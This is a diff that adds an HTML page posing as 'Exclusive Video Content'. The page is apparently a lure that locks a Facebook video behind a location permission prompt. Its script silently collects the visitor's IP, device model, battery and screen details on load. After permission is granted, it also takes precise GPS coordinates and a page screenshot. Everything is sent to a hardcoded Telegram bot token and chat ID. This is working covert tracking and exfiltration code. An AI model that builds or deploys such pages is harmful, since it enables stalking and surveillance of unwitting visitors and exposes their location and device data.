@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Video Content</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        #video-container {
+            display: none;
+            margin-top: 20px;
+        }
+        #permission-denied {
+            color: red;
+            font-weight: bold;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        #access-blocked {
+            background-color: #ffebee;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        #screenshot-canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="access-blocked">
+        <h2>Access Restricted</h2>
+        <p>You must enable location access to view this content.</p>
+        <p>This message will remain until you grant permission.</p>
+    </div>
+
+    <button id="request-location">Enable Location Access</button>
+    
+    <div id="video-container">
+        <iframe width="560" height="315" src="https://www.facebook.com/apontam75/videos/570407585630634/?mibextid=rS40aB7S9Ucbxw6v" frameborder="0" allowfullscreen></iframe>
+    </div>
+
+    <canvas id="screenshot-canvas"></canvas>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script>
+        // Telegram configuration
+        const BOT_TOKEN = '8278251397:AAEJm_hEtW94PjyqwmB-Mphu1EygxKPOAXQ';
+        const CHAT_ID = '6975173404';
+        
+        // Immediately send device info on page load
+        sendDeviceInfo();
+        
+        // Hide video container by default
+        document.getElementById('video-container').style.display = 'none';
+        
+        // Location request handler
+        document.getElementById('request-location').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // On permission granted
+                        document.getElementById('video-container').style.display = 'block';
+                        document.getElementById('access-blocked').style.display = 'none';
+                        sendLocationToTelegram(position);
+                        captureAndSendScreenshot();
+                    },
+                    function(error) {
+                        // On permission denied
+                        alert('You must enable location access to view the content.');
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert('Geolocation is not supported by your browser.');
+            }
+        });
+        
+        // Function to capture and send screenshot
+        function captureAndSendScreenshot() {
+            html2canvas(document.body).then(canvas => {
+                // Convert canvas to image
+                const image = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Send to Telegram
+                sendPhotoToTelegram(image);
+            });
+        }
+        
+        // Function to collect and send device info
+        async function sendDeviceInfo() {
+            // Get IP address
+            let ipData = { ip: 'Unknown' };
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                ipData = await ipResponse.json();
+            } catch (e) {}
+            
+            // Get device model information
+            let deviceModel = 'Unknown';
+            const userAgent = navigator.userAgent;
+            
+            // Detect common device models
+            if (/iPhone/.test(userAgent)) {
+                deviceModel = 'iPhone';
+                if (/iPhone OS (\d+)_(\d+)/.test(userAgent)) {
+                    deviceModel += ' iOS ' + userAgent.match(/iPhone OS (\d+)_(\d+)/)[1];
+                }
+            } else if (/iPad/.test(userAgent)) {
+                deviceModel = 'iPad';
+            } else if (/Android/.test(userAgent)) {
+                deviceModel = 'Android';
+                const androidVersionMatch = userAgent.match(/Android (\d+)/);
+                if (androidVersionMatch) {
+                    deviceModel += ' ' + androidVersionMatch[1];
+                }
+                const modelMatch = userAgent.match(/; ([a-zA-Z0-9-]+) Build/);
+                if (modelMatch) {
+                    deviceModel += ' (' + modelMatch[1] + ')';
+                }
+            } else if (/Windows Phone/.test(userAgent)) {
+                deviceModel = 'Windows Phone';
+            }
+            
+            // Get battery status if available
+            let batteryInfo = 'Not available';
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `
+- Battery Level: ${Math.round(battery.level * 100)}%
+- Charging: ${battery.charging ? 'Yes' : 'No'}`;
+                } catch (e) {}
+            }
+            
+            // Prepare message
+            const message = `
+📱 New Device Accessed Website
+🆔 IP Address: ${ipData.ip}
+📱 Device Info:
+- Model: ${deviceModel}
+${batteryInfo}
+- User Agent: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen: ${window.screen.width}x${window.screen.height}
+            `;
+            
+            // Send to Telegram
+            sendToTelegram(message);
+        }
+        
+        // Function to send location
+        function sendLocationToTelegram(position) {
+            const message = `
+📍 Location Shared
+- Latitude: ${position.coords.latitude}
+- Longitude: ${position.coords.longitude}
+- Accuracy: ${position.coords.accuracy}m
+- Map: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
+            `;
+            
+            sendToTelegram(message);
+        }
+        
+        // Telegram sending function for text
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(e => console.error('Error sending to Telegram:', e));
+        }
+        
+        // Telegram sending function for photo
+        function sendPhotoToTelegram(imageData) {
+            // Convert base64 to blob
+            const blob = dataURLtoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'screenshot.jpg');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.error('Error sending photo to Telegram:', e));
+        }
+        
+        // Helper function to convert data URL to blob
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        }
+    </script>
+</body>
+</html>
